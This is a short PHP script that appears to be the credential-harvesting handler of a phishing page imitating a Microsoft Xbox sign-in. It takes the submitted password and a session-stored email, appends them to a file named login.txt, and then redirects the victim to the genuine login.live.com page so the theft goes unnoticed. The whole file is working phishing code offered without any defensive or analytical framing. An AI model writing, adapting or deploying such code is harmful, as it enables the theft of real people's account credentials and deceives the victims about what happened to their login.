<?php
include 'ip.php';
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pass = $_POST["passwd"] ?? '';
    $email = $_SESSION["Email"] ?? '';

    $log = "Xbox Username: $email | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://login.live.com/login.srf');
    session_destroy();
    exit();
}
?>
